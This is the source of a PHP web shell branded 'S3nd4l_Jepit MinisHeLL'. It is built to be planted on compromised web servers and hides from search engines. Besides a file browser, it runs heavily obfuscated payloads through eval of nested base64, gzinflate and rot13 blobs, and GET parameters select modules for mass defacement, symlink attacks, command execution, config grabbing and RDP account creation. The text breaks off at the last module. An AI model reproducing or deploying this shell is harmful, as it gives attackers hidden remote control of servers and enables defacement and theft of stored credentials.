<?php
// Sendal Jepit Minishell - Stealth Version
// Download : https://github.com/cowokumel/s3nd4ljepit-minishell/
error_reporting(0);
set_time_limit(0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);}}
echo '<!DOCTYPE HTML>
<html>
<head>
<meta name="robots" content="noindex, nofollow">
<link href="https://gitlab.com/s3nd4l_jepit/s3nd4l_jepit-minishell/-/raw/master/files/s3nd4l_jepit-icon.png" rel="icon">
<link href="https://fonts.googleapis.com/css2?family=Varela+Round&display=swap" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Sedgwick+Ave&display=swap" rel="stylesheet">
<title>S3nd4l_Jepit MinisHeLL</title>
<style>
body{
cursor: url(https://gitlab.com/s3nd4l_jepit/s3nd4l_jepit-minishell/-/raw/master/files/s3nd4l_jepit.png), url(https://gitlab.com/s3nd4l_jepit/s3nd4l_jepit-minishell/-/raw/master/files/s3nd4l_jepit.png), default !important;
font-family: Varela Round, sans-serif;
background-color: #530500;
color: #FFFFFF;
}
#content tr:hover{
background-color: #FF2E00;
}
#content .first{
background-color: #FF2E00;
color:#FFFFFF;
}
.s3nd4l {
background-color: #FF2E00;
padding:4px 4px;
border-radius:2px;
}
.s3nd4l:hover {
background-color:#850030;
color:#FFFFFF;
}
table{
border: 1px #FFFFFF solid;
}
a{
color: #FFFFFF;
text-decoration: none;
}
a:hover{
color:#850030;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
.me {
color: #FF2E00;
font-size: 29px;
font-family: Sedgwick Ave;
text-shadow: 0px 1px 0px #FFFFFF;
}
.S3nd4l {
background: transparent;
}
.S3nd4l:hover {
background-color: transparent;
color:#FF2E00;
}
</style>
</head>
<body>
<center><div class="me"><a href="?" class="S3nd4l">S3nd4l_Jepit MinisHeLL</a></div></center>
<table width="850" border="0" cellpadding="2" cellspacing="1" align="center">
<tr><td><font color="#FFFFFF">Path : </font>';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
eval(str_rot13(gzinflate(str_rot13(base64_decode("\x6a\125\156\x48\x43\x69\x79\x35\x46\x64\x30\x62\x2f\x41\57\x44\70\x42\132\167\144\x30\x53\170\113\x32\104\x65\157\162\161\151\113\155\x66\x6c\165\x42\x6b\161\65\x39\x68\144\x38\x65\x75\x6e\x44\130\101\107\x4c\63\x6b\x73\x4f\x43\x41\x64\147\x62\x6a\123\61\124\63\x6e\57\x67\151\x32\x4e\104\x48\x54\x63\151\x33\x4b\x58\x33\x37\53\70\161\x75\x75\x36\164\164\170\x79\166\x33\x7a\x43\x7a\x5a\x6b\x30\101\x6e\156\x72\170\152\x78\166\71\103\x75\53\x4e\103\124\170\x5a\121\x48\x66\166\53\x50\x76\125\x33\110\115\x32\x65\66\x32\x58\x4e\106\152\x56\x35\113\x32\x53\x47\121\x66\x4f\x4b\x2f\x59\x39\154\x6e\x36\66\127\x6d\103\164\146\57\163\x39\132\150\144\x4e\101\154\x44\x55\x51\170\64\x64\x49\167\x35\x74\124\x46\131\154\167\x65\151\70\x78\x57\131\x79\63\67\x6e\172\x48\x61\124\x71\x6b\160\x65\x61\105\151\145\x61\x4f\67\157\112\x2f\67\x4c\x79\57\53\121\x67\172\70\65\53\x66\x50\130\x2f\57\x35\x39\x37\x2f\x39\115\x4b\65\153\120\x6e\x2f\x2f\x36\57\113\71\x46\x79\57\156\152\x61\147\117\x2b\x33\172\102\x7a\115\x51\167\x4d\106\111\x6c\131\x76\x6a\71\x61\x52\x73\131\143\x34\x34\x79\x70\x67\132\170\x4b\132\x65\x6e\x65\x75\x67\113\x59\57\x72\x36\155\x50\120\132\63\x72\144\x41\154\x48\161\x4d\x59\60\x57\x52\x48\x78\x32\124\121\157\61\x35\145\x2b\130\x33\x4a\127\x62\x61\x67\70\x35\x4f\x62\x58\125\157\156\x6c\x66\x30\x2f\x47\115\x6e\53\153\151\117\66\x48\120\x79\x55\144\x69\120\x55\x58\x68\104\x4a\x49\x39\x73\x56\155\150\156\x34\171\107\x70\x69\104\61\x54\x58\x71\x49\x4c\x39\x6b\x51\121\x32\x65\146\x6a\x76\x5a\x4a\x7a\154\x4d\110\172\160\152\x55\142\x68\x42\57\x7a\153\66\67\x46\x4f\x6b\53\142\113\62\x74\162\122\130\122\x52\x4d\157\110\121\x6c\117\x4e\116\x57\66\x35\x73\127\153\161\x79\x71\x32\164\60\62\165\116\x6a\x53\125\x63\153\171\x56\130\142\160\113\141\x4e\160\113\x56\x45\x56\x66\117\x77\132\144\111\x6f\x36\123\x39\144\62\126\x57\x45\172\x58\154\x67\104\167\151\154\x62\x4a\x6e\x4c\x74\x79\x4b\x54\x61\x39\x31\101\105\167\x42\152\x79\70\x30\x72\x38\154\165\x68\157\67\102\125\x54\x70\x62\x47\151\104\160\x32\65\62\x69\145\126\x68\117\x34\x35\x6a\171\x76\53\x76\x35\x38\x72\x49\122\x67\60\132\x68\x4f\162\141\x62\112\x34\64\71\x58\x73\x37\144\124\170\x2f\x73\125\x70\67\x41\x37\104\x73\142\x58\143\x4d\115\67\x33\102\x6e\104\161\111\157\x30\131\146\145\160\163\127\x6a\x64\166\141\x61\150\x4a\116\x41\57\66\x45\122\117\x78\x71\131\x36\150\x4b\161\127\x4e\x67\x44\x66\123\x6e\x49\125\x61\121\117\66\125\171\101\x67\146\104\151\170\61\x63\x42\61\x4d\130\106\x37\x6a\125\x6a\162\147\105\123\x69\156\x38\113\154\101\x36\70\53\x2b\170\x36\116\117\102\62\x6f\122\106\x67\146\x49\161\155\x42\x6a\155\160\110\157\x62\122\103\x72\x58\x5a\x77\x50\x76\104\123\164\171\x32\53\115\165\x66\107\x6e\x33\x6a\x49\160\x7a\x51\x73\x43\x47\65\x6d\x35\153\127\62\x75\x56\x74\x49\132\x36\x59\161\162\x45\154\x44\123\165\114\x49\x38\131\132\x34\x59\x4f\125\x74\x4a\162\166\x39\x49\x49\57\x59\62\127\x6d\153\117\x63\162\x38\x75\x4f\x79\x4f\172\141\143\x59\123\x65\x6a\115\x32\x67\x70\x68\x69\x30\x74\x76\x66\x58\x51\112\x39\x33\64\170\x32\146\112\101\162\x6a\x55\113\x59\x70\x76\152\x4c\66\x2b\x51\x74\106\x4f\147\x6e\x79\x62\x6a\x6f\67\x48\x62\151\x48\106\124\x4f\145\x35\x48\x4c\127\127\x32\x4b\144\x67\x48\x4a\x33\154\145\150\x44\70\64\125\x52\71\172\167\141\160\107\x6b\x43\x4f\x45\x51\156\112\103\x76\x50\110\155\113\x61\x47\x45\105\x48\62\105\x4a\144\x6a\115\114\106\x6a\101\165\x35\116\111\115\x31\x66\151\101\x78\105\x54\x65\x34\x58\x62\124\x6f\x4e\123\143\107\116\x44\x38\125\x41\x4d\122\x33\x65\x6a\127\57\x41\x54\156\150\67\x4b\x79\115\x6b\150\164\66\152\x75\x48\110\147\127\154\120\104\105\70\x46\x57\157\160\67\x62\121\x41\164\x66\103\x36\x61\125\144\x4f\165\x6a\x59\x48\163\130\111\123\157\x74\121\x4c\153\x77\x4b\147\106\61\x38\x6b\53\x42\105\155\x56\152\66\x6c\115\x79\x6b\x2b\66\x4e\x78\x4f\130\144\102\x76\x57\x67\64\62\x69\156\126\152\110\x4d\x55\x54\x55\x53\124\157\117\71\x6c\124\x4b\155\x64\157\151\161\x68\127\x45\126\61\130\x70\122\146\x41\x44\67\144\127\116\161\x68\166\x5a\145\x74\145\142\111\124\x66\114\62\113\147\122\x66\67\120\x4e\x30\142\121\x51\65\x4e\x30\65\x68\x62\57\x48\115\x4f\x52\x39\x57\x31\71\x49\x6c\132\x74\x54\x6a\163\120\110\x31\142\x53\x73\104\146\131\106\x47\x6d\67\155\x58\x39\x31\57\116\157\x71\x45\x34\x57\154\x79\x57\x4d\122\x4d\x34\x37\x4e\153\x4e\155\150\146\107\x6f\116\x48\x71\x48\101\x57\130\131\147\172\x51\101\172\166\x4f\x52\172\123\x6a\160\150\x48\65\x69\x35\151\165\162\117\x41\166\x44\x4f\145\161\67\x53\146\156\x53\x49\112\x58\x69\x77\x64\x39\x6a\117\156\106\x59\151\x54\x4a\x4c\132\x58\x6a\x5a\163\132\114\145\63\144\x46\120\x53\165\x72\x50\151\x58\147\141\x64\141\141\171\71\x75\153\67\x64\x6b\x76\152\x4b\61\x6b\64\145\146\71\153\60\172\110\156\114\x53\x5a\x47\x6a\164\124\x43\116\113\117\164\x59\161\x55\62\126\62\122\x6e\161\164\x6c\121\71\x71\147\165\x2f\126\111\x6a\x6a\165\170\110\x45\x4b\157\171\x6a\60\x7a\160\x6d\x49\101\x58\105\x68\x47\x35\x72\101\57\145\x73\103\157\x64\103\x64\125\62\x46\53\x55\62\x47\x33\103\x53\x4c\161\157\150\x34\x52\x4e\146\x62\x58\x79\x66\x35\x41\x2f\x77\114\x65\x6f\122\171\x33\x52\x5a\x4e\x69\112\146\65\127\x77\165\107\65\141\x61\145\123\x52\x33\x78\x78\x7a\x44\57\x39\122\125\65\x41\x47\120\70\x47\x56\71\112\x44\143\163\123\127\70\x42\113\x53\107\110\166\x47\x61\x42\x75\107\x58\131\117\x73\x43\x59\162\x76\126\127\x4f\x6a\62\x4b\161\154\122\x78\166\x67\x59\113\155\x70\126\x2b\x31\166\62\110\116\63\146\x6f\171\x34\145\x67\122\x7a\57\x6c\172\147\145\62\157\103\x48\151\70\65\x54\x72\142\x48\117\117\115\105\x6f\x35\x68\71\170\65\64\156\172\x63\171\144\167\x44\x55\x7a\x6b\161\143\x6e\141\156\167\x35\123\106\x56\x33\141\116\x35\125\131\110\113\x78\x67\x4a\x37\x41\101\x2b\x4a\112\66\x37\x73\160\x4f\121\116\x33\x78\57\146\x43\147\x54\60\152\x69\x42\63\164\64\x39\66\103\142\104\x6e\x66\127\122\x71\116\x74\x31\x47\53\127\x68\113\153\x59\x48\132\130\x38\x67\x76\x51\104\105\x6d\x33\166\x4e\x2b\x4d\x4b\62\57\x62\x64\102\115\103\x51\102\167\x58\x69\x36\121\x68\x52\103\121\145\x70\101\x36\70\155\115\165\110\x4e\x70\124\x4f\x36\113\113\170\66\146\x44\x77\57\x5a\131\x35\x78\104\x68\x68\120\116\x50\x6f\x4b\x64\66\154\145\x6f\x4c\64\53\x69\146\166\x4f\x70\165\x50\x63\x4c\x4d\x67\125\141\157\157\150\x69\67\150\x4f\x77\117\x69\x39\101\x38\155\x50\x62\x68\x33\124\x4d\x52\67\x44\x65\x2f\x50\142\170\x61\x77\165\x39\105\60\x6d\150\x6e\67\131\160\x64\110\101\152\114\143\x6b\x38\x31\x2f\153\x79\157\101\x6d\x6f\123\x36\157\x52\61\x6f\x6a\147\x4c\107\x72\117\x55\107\x4b\101\152\x6a\102\172\x38\161\x47\x61\x42\x79\106\x6e\x78\165\x73\115\132\117\115\105\x67\x46\x6f\x2f\x58\x69\x4a\x50\x4e\x33\x37\x49\x4b\164\62\x44\x78\x52\x51\107\x51\167\x33\157\62\142\x4a\141\160\125\170\x46\107\131\x68\144\x73\x56\x47\x47\x64\161\67\x4d\124\123\120\x75\161\150\x70\x4a\64\141\x6e\145\110\x44\x31\x74\67\x4b\116\x42\x4a\x64\170\106\x45\57\x64\112\x68\x30\x71\147\156\115\x7a\65\144\x69\153\x64\x4a\114\143\161\65\x41\x68\x52\103\64\x65\x41\x73\x69\163\141\x77\157\x4a\x42\x4a\154\x59\60\x57\x47\x46\142\150\x67\117\53\x79\70\x48\107\x38\64\x65\162\102\102\166\x54\x49\67\x49\152\x6c\x50\x68\x65\x44\x51\53\163\x69\130\156\126\141\x79\x59\x63\x4e\163\167\117\57\x4d\60\126\x6a\x69\113\x37\x67\x62\x78\x45\110\x59\x50\144\165\161\164\130\130\124\x33\160\147\65\101\x6f\x56\x42\145\64\170\x62\65\71\x79\x63\x31\161\x54\x56\x34\x4f\160\155\x63\142\x57\x4b\x51\111\x78\x35\156\171\x56\143\x41\x30\114\155\x62\121\x6f\117\53\x78\120\x6a\x38\155\x7a\x2b\113\x37\117\155\131\x6c\60\x56\x31\164\167\x6e\x41\132\71\146\x33\126\x66\60\x43\x58\x70\62\x4d\63\156\x6d\62\x71\141\115\121\147\162\x50\x78\x49\x79\x72\x5a\x38\161\171\x56\106\x65\x79\164\x4d\x33\x71\x6e\x46\x7a\x56\x41\125\x65\x4e\x68\x4b\x4a\161\x36\53\142\64\x2f\x47\170\x53\153\x4c\102\122\x48\110\141\122\121\x4c\151\161\125\130\62\162\163\170\x43\156\71\105\x74\x75\x61\127\60\x77\150\64\155\x56\x61\x49\142\62\154\111\104\114\61\103\x44\x71\x34\115\x4a\x74\x4b\122\x5a\165\166\x6d\65\x43\121\130\x70\x2f\146\107\x43\x56\x72\162\x2b\x5a\x74\161\x61\x49\66\152\x43\x50\141\x38\x54\x4e\x5a\106\125\101\123\102\x71\x75\x34\101\x41\111\131\124\x58\x71\x62\161\x4b\166\122\141\x30\x65\x68\154\x50\x4b\102\61\155\x34\x48\x6b\53\115\x50\151\60\67\x76\x56\150\157\132\x61\x41\x4e\157\x30\127\x73\155\116\x7a\x4e\143\x6e\x33\x2f\x61\61\104\167\x39\104\64\x63\x73\x37\163\65\64\141\61\x44\60\x32\64\131\156\x78\57\x47\132\53\x4b\x6e\x4b\102\x36\170\x33\57\132\122\x59\143\x42\x41\x51\165\x52\146\x72\x35\165\x72\x76\x63\x77\154\x42\144\x6d\x76\x63\x45\126\x38\x44\x72\116\x74\160\147\x4a\x51\144\147\110\117\64\110\122\143\x45\162\x4e\x39\x4a\124\x61\x5a\x44\170\71\x53\53\x7a\130\160\166\x78\x2b\x6e\x71\162\x37\161\x76\x4d\x31\x6d\167\x66\162\62\167\x62\151\x2f\x4c\x33\143\160\x32\x2f\x37\x76\x31\142\130\126\x78\x2f\x7a\161\x61\170\130\106\x62\151\x33\57\171\120\166\x35\161\x62\x66\x33\172\x48\71\65\147\x2f\x41\x41\75\x3d")))));
if($_GET['s3nd4l'] == 'zonh') {
// https://ghostbin.co/paste/wypy6ha/raw
eval(gzinflate(base64_decode('pVRRT9swEH7upP0Hk1W4SB1JGbyUJBIarcSGKErL04oq17k2Fo4dOQ4tm/jvs+ME0KgmxvrSXHL3fXffdzZb9bqL68l09gOX1TJnGt8eoF8fP3Q63VTmhAkUIdgWXKbQ8+ZqLrw+agsqxU32aZ0sGL0zqU/fbIxv629AM4m8c1gRCgpNRCZ5OkQhQZmCVYQzrYuh7282m8OfUsDn7FCqtU8Uzdg9+EJqtmKgoprBL6olZ2UGaRRgpIlag47wYsmJuMPxe5FCn8ThUsXejnbPXPU7+/2/Htu+nntbVYJqJgWytVmvaxzo16mNZ50uzYwL1LxfMMF0z3vNR2XueB78kok1B89Z2OkgV1iCloXuGag++nqTXE6uZ4tkNLtJrmbJ2dV0PEr6SKsK3lBmd+GfkscXo8vzaR95qdPfCbHvVnEQ2YH3M0LvcrOP0WBfASmlMA9ud6MpiLQdR4GulHB0sAVqyf7ognJZwvP7x1piaUCp0bZZf1Iiy/okcK280fiVAw6arXqFgvUiJ9qAeD6VXKpo7n0aj4MgGMy9ePI9nPsrKXRs/jmLfWaPVA130LI0S2jRURyj0KYjB2WA7M/CNChP29F5RMBLeBPG0SgI4lGSTJK9HTitGi8BHVxIQWgwO2l0ylEOOpNphAtZahzXFHFzcoYvYG15yERRaaQfCoiwhq3GSJDcPLtzUuoHboINS3U2RMcnQbE9RRmwdaaH6MhGGN0TXpmc6ReRHvPFNyiYJW3xHXltWvmSPLRkxJj6d47BiSNxTdmrDRXcDGJvK7OHeCIAFeZC4EzAoaH1W9jdEzaXaQPXRu0Edbi3e2rswHwrsDPEOtGo7zfye6e/AQ==')));
} elseif($_GET['s3nd4l'] == 'mass') {
eval(gzinflate(base64_decode("7VVda9swFH3OYP/hrgsogRJnZX1Jau9phW5sLaRvJRhFkmutsmQsuUkY+e+TZNn5IO1W1scGYss6uufq3HtkZ7UkhisJGi9qmRZYaywGfcqr077EBc64YKd9rnmqScVLM4Tf79/1ejwbcJ0uK27wQjC/fhignnvAEIMmWNphA049lKmKYZIPmiVYgxss2kAfSWzkiRtEHjuZBkioB6y5Bf2iEYrQqNtgWGM35WMgjmNAI9Tx9tyitKxNSpQ0TBo9CHynsKst8GyACc0O2P6XrgtuStcWhgy3tMequof3GMkVnFxkNi0QJVQVf7y8PPs6Hid3F5GbTQ4w90uuvx8HfeD8mUAIstoliypp+/HiKrgeZpg6Xxw6jTxhtS5yEwbh3tz81V3cP9u38YJjjd9c/ObixsWuAFFX59dx89896Uqf3lzPbu+QNrgyaL61XQsYXrLUexbNwXWowDkWXZNCpSh/BG3WgsUWr+65nMB5uQJcGzWFElPK5b2fQq2i/TMWklHXLzS3groJp3p3plFpdzrdzR/ZDQTmraueVFBXOH8tBeEgv6YA152tl8MCYjvOgh86e1YFFMzkisaoVNqgxILeYMmMCUYM3K5LNtmxk8O5tCYCY5EYVZhyhcAazz7sFAoesahdKXypgOSMPDCazGwRBAOr8WUs3jLJD9tsHxs24nd1qQRl1XN7NGxlWvKmvi1v3z+Eri05NfkEPp+Py9UUQc74fW5i9GmMkv2Eth+O7N9T+g62OculHOWmeHHaK0nZClzyw8QuGbbv65Av+OMof6CfwNnYp0tulpLCYg0zJikW6TdWcnMRtYxHtel6UfBOXXPuW3GuQx+ekOaJIuc5T9uo+qkMgwlcZbBWNSyxfbUZBYVvtHWgBTH4T5vHf9XagGSMukX2SAH6QmMHawRKirXjHTB7zHJjykkUPXL7ySxGRBWR9gJHZV62IcO2jNHu0dj8AQ==")));
} elseif($_GET['s3nd4l'] == 'syml') {
// https://ghostbin.co/paste/ztcu3/raw
eval(gzinflate(base64_decode('7Vf/b9pGFP8dif/h9cpke6E2JOsiBcxSNanWaWukkm6TkgoZ+xx7NXfW3RGHpvnf9+6MCbUJqGqkalORQPb7fu/e+7xHJ55nGfgglZgImmdBSO3OZHz69s/TtxfWydnLd3+cvjmfvD07O7fed4GQLnTyQCXOoN3qRL1ZkDKJ6sdxmlGbeFSFHgtmNHJDzmKipdLYrgSd23brePYhSoVNxgcs+imb/EbzVE3kYka6vcPDQ61wHCabJQyT3tDQJhmDZxI8EJwrQ+/oAA4wEussVynHoF6zCGUlvOJZxovxYvZ7yj7IduskFTRUXCyMAKx7cRM1a7deRNH5Iqeg6I3yMCMpAzdPcjCcXwMWZVTUme3WOFCpjBfwgi0sE0+uo4l5TpltoeEgDKmUVtcqrDLewvALkSrMOEp3yyM4g+M4zLgsiVqUhgkH0m4NVTDNKARZesX8kDKFYUy5iKjwD/D+Fhn1rSKNVHL0c++HQcl5FvKMi6Onr8xnYI20GWF+o88sjYYxZwpk+pH6+6OxC2+4O/Q0bTT0VLRT44SbG/4SlXeSii9SwDvM8A5rKh6eh5hqDPkchX3o41vMBQ3CZFV6EEhYPusqxKKkgl6lNvnIGSXdiuXc5kiezAIVJpMgy2zrqRYAYrs/OuSp1a2M6IfyyPqK4mwuE3tZ7dhKGV66EunMroQu+u8veu8dB0awr/135nh4DDXnMr2ZXFGVF/M0sk0b8YJRseyla8xGIKn0iFs3taoMvNBa0jAxnyWOgAtVelxUeCDnGY2RGkAiaOwnSuVHnlcUhVv37RJvaT/MAil9daNGTZmVl2DNk5bTR7+wNEpYRmzFq1xbHQ1KXr3/Pd3sXsJn1GtY8fL5NEvDCTZwZoEKBKbUtybTLGAfrEaw9UJaRrgsJVi/z2Xa9vYGd3d3q4x7phVN2d3RTFJ9o+en43O/xEHL3F2O7orIKqsCbCPwCAj4HwFA2IWAsAUCkVtHQahgELbgYH9UohtsA5KDjfC2Q2UDWO1y0kSrFVbB52AF5tyrZJG18sF5SwRxgAugN6myyTtmTq84aFnQik9MAUCR6Np7ElOOE1fTHV1t0NHzOcZ+kEuqcWgQjmpWIESwsEuqDugeALGOLz0Evl+cy6NLz5Ma/WR3pVs3tL5CkLJNu7gvVBKIC0bjHiFXhhAV+/vw6RM0GL4PPc24d+MDmaaMNIg6ZX/3+14sm7zrQHhZOvXYQ8xA5IUmbeZe8TyhosmTGwMx9qJZkzGXaArx6oEYYpVvPhXbxNAaiM2bGWYDIw4mG7cwlbI5vW8g3SDbx2xjWmyt9rURoPWqUCpFsu55h4EK/3fDf83TOvo3wH/Vh8EDTaixfQU2VYPUgb6Eeb3LcglPMM9/pSzihSTO7S4834LmepttYPk9kmMc3x7M262vhvMtWF6VQrJa72BMxTUVQw9Jj4L2r0++KdIrOssxL4QMOrjN9fGxZ572Nfj3ej0thNuqvWQPfTDc8nVvz4HbDq6G+j9WbVk0AktIxfUCSU7pzPXhH57iLR1ZXUN2ySXDEq4Sbw2nwhtZgyq0clPVL8vie45EE5WZRopK5WJ/IpoX5aSJ83k1TZ53l4qavNZEz9HU2oyrBtwmq1814JrT7XFG2/e59n2u/Q/mWq0rN4y2oRel1/i7jJ0M5kybXWtQo3QHegDCvfomIHwZMMbx5PjXW1Gow+LKgzanv/8C')));
} elseif($_GET['s3nd4l'] == 'jump') {
// https://ghostbin.co/paste/ko3s/raw
eval(gzinflate(base64_decode('7VhLj9s2ED5vgf6HKdeA5GZhOgVy8VpOgRY9FAFatAF6WC8EWqIsbmRJICnLi+7+9w5FPWjZToJFWuRQHyyJ8+DMcL5PY08EBDC//fabKx6lBZBlLPYQZUypwNsxuRX5At6UB2CVLm69FTGaIvFLybfhjuko9QlNVZlyySm5gUks5HQKf6PW1aSSmULv/FBmRcx9spbr3OiEv//25/s7D8Xe/dQ4NB6FUlz7neyh2pUobD11seGuNoKrq6SQnOHudhOmwNx06s3WuLPSMpS8zFjEfSYle/RJqnW5oBgqqet6RqY3QDAkVNRFVtRcNg6nNir0w3WEfgjFKy2xKHVMOlGCgqQoee4brRsiSWdVpyLj/mTLtUk/MVd/kvTJoG3JI5a6pVmYuhjFzgemoLhEFat7N7/vBVjisBUOtc+KiGU0LXacNpZdmLa0Idr4veEUgiAALSs+hNSUrHPba84IJTMj6by17rD2MduYJDsrJzv0JV69uh2eHmRtYr1bJkWuIcJCy+D6l+az+mNJzerqHpYMUsmTwHsbB71bb3XOqBe3xkvKVmTY0MZYS6E/EuMnwvrrX4jrub9r+tkEMCPLjXR0OpX2ai/PLUQmiFUEK2YBZuUZeKb4MULQ2fuUgy40y0Ao0KY5AM9QzAgooTkUefNYNls2nltTOqDr1LO3jHiuuVzZuAAwfbmDHddpEQekLJQmveydUBp+LnZM5GoBJqbeSvODZtg9kLMdDwjWC8PSjxne1yLWKZLNfF4ebiHlYpvqBfzwxjySlWdLNEnKHnbj5o+KPBFbahAeU5Orst8zfdDEwacDTxef5dAe9ngahdvhBOwyloJ2WayOchN5WWnQjyUmo6rNTmgCe5ZV+Pgr0pnIt6RN27DbJ/Nu0u6dU1NvbKj2GLz++OxZjSl5n+KJqKfmMublI8U13TO5pkiGa+rPvn87XdNOH7/3qa3Z10Xllrotcze6HSXXfBPu04YXMSuTlKGvfXr3+h6ZzKja7igi1UHOoUdrfY4cx6TXarrs6TLeSwjPurxAK1Z4llTGXHca2suI7qXx9Bx3ieL+Z7bzzIY+NkgRPhHlApPoyOor5hxbxRM8tzNTx9HO5ISIRRKGQkIsEMWj1prP569XP7Hc02CQBo5l22ltTVr+tqKBwFG9b3vTUp08AM+Dpyf4rtE4ovgXhNC+D9w2cgg1ZFnme5ZIF4cF9ZCgrL1hKhwMwgd7Kh1lDdznCJGuLA2aNREfmnVnenR1DXXZQbAf/XoTWlabTERhqnfZaB50BriRsy/KamPnl8amkdpnMd3HAn/hcPcFoz3lQTeRpMojLYo85AdkFOV7SDPiEGIjl3UlYu84l7ghnGZL0+7Y/UYzxHlHIzJVCzID83hmhiDEyZU7DB87MHg4GoQtFCBYgQ+XAaHZB25IF6yzhlXazGF6PMSO4HEGIuS6eUE3IVu0zOLNdTN3DKH2T8oCYPA/wMZV6GATPxylN8KLHSeO6+3/aIpa1Dn+/rPFRA4VTOEEid7I1N36rLuTtTvP5Obdu4bmJE5tg4s4Pz2caoXhLGl1WnH8bLAkH9yV4eeGc9vfnZzR8J79nJ8j//Wb+3n4h4LGYo+L/wA=')));
} elseif($_GET['s3nd4l'] == 'cmde') {
// https://ghostbin.co/paste/wggnq2s/raw
eval(gzinflate(base64_decode('VZDNS8QwEMXPK/g/jLEQvbSu3vqFF70q6E1k2W1mbaD5IJlIV9G/3WnrCub0Mu/3Jrxg1zsQ9d4FAwapd6qR3kWS7enJiseWIOoPbOS1bEWepYghF7estM9FCd+QQV1M2Mxr6xMBHTwHCEeSv+GbKwk96reeGrlmbbeGp51Rsv2XiWlnNB195TYTApEOA193LigM5dqPEN2gFZzfz6dyiQZtsbTOYiXhfTskxu9G7BLh2dKkmBq2omKt9xfZ5vHh6fnl+MLrJXyyscLlM3xA7ooj/nELlIu6mL1py9cP')));
} elseif($_GET['s3nd4l'] == 'cprp') {
// https://ghostbin.co/paste/ufkh
eval(gzinflate(base64_decode('nVJdS8MwFH0X/A+xDtLCaOcXSD8mwiq+yKQbvoiUrr1dA20SktQp4n/3pnV+PAn2pZxzek9z7gmUjSA0LoEbUPO4FtzM065gbRgHA0BKdaQoDRM8cRzSgWlElTj3y9XamceMy94Q8yohccDOOYQX3TfQ5rVFtGOVaUJyfjGTLxFpgG0bE5JTi5zgt4vuNx0ze5s9ei7aHuEKeHX05boRqgIVnsgXokXLKnJ8MzyR6E3LOIRccBh+ENgU+PrMSaPDg0mvQZGEbMHkZa8UKrmlXM+KmhlAcZKv0uwhzR7p7Xp9n99iaPpkdSb1OAv82aVZerdcp/n1YpFRO85ql2kNxp3kdk+PdIxBnzzvDYeH3Qzuozrg0XdnjzQSIfXHLy1fI10LCdylQSM6CFC0p/Vp4Jey4NAGJdZle+K1oFNCd8NJ6p3CJO6knhL09iKCVNkKbSnvT+N/OcoCLwyGsyv0aXg6uzwLFOA2ZKH1lTaFMsmJbQDGu7dRWNC+GH8Y9+mPqsj7Bw==')));
} elseif($_GET['s3nd4l'] == 'conf') {
// https://ghostbin.co/paste/4n38qos/raw
eval(gzinflate(base64_decode('rZbrb9MwEMA/B4n/wZhKTVHbjIc0Cdoi9kAIMYaoxD4Aii6J05g5trFduortf+fy6JKWAYpo1TZuz/e7h88+95iLyZSkSjPp0wB/BRqsXSV0SKihA6IMSTjz6UQbNpukSjoSK6HM9OHr109ODw5mxyD7jhgGCWmpT4Ji6mwSFGp08OL+Pa+3gDWayi8Tbnw6fyqTZyJ8yzR3Yaxkyhdo8uDw8LCazC0Ps9I3eq4dV9ISEOKL/Mi+L7lh5L2S7Iucg+M2XZNXck1Ltawdzh02gnHmII6ZtXRIV5Vj6cpwx/xCd0g2hkvJKuMCBVVIBXfBnPV7GOZgQH7iBI+njRhdpeT6mjwoJ1Ryj8WZIrRz4spovBvChGU1CTO5CHNwcRZiJvx+4I8fvRw8v3oe9NHtShsHS8tMHWwZg+elCo3Emd8WfX78lYAlvXaKNi577YkhrlaxCEGmchZszQ/0MhI8xmzlIqgcLhPCbVhEBVGRux3U4NYI1oOBqBahBTAG1n4t8+60N87X41imlExnhMYaJBN0+HeNaq0zsFmldfHmbNT67+/a7fi0GqGrjkkXVC6PdaYr5gel1TfegfUjUeEu5JNSiVIdINFqVDHsxiEuecU6UvaCRR1Y9d64xD11aXnj1Dt1iYoJhw4ssdHZKzUWHFMPWFc1dmmgOBUaKq7s8bwDcZXle0TFdl8w3K3L/Lcaw8HRUQeKxRPNBglLYSlcYJlzXC5swzsxSw3/2j13lMgticu4tQMMsw7mmdIdiKB1ee4JFYMYX+WiYp3BAle6y074plQu/lgXb0tp50j/n7PS+B7tLuSFMkmRLtuFhDq60NkbcD8YSHIufyvVc+y9x2Bcl2oVu5A51i+eJN3KCcflom2KNQEHEVjWYE+F4FZAROvW2GqO7W5UdMZNY5qRnoQcNi31tn15PcgjLpoGluJdIcQLQlj3CbwobLXhqjnuaE1Jv99ibjX80khJbWz8+WKzlZlR2+exu3LNbad6pXpZONiiD7c8a6be1IP6eeN55aD8eVOMi1F9y4nMbBJj6AyfQDLD0mn/pQaXTXvFd3CH3/3qUjk7OX9/+uD21gj4qUH0xS8=')));
} elseif($_GET['s3nd4l'] == 'crdp') {
// https://ghostbin.co/paste/8929mbs/raw
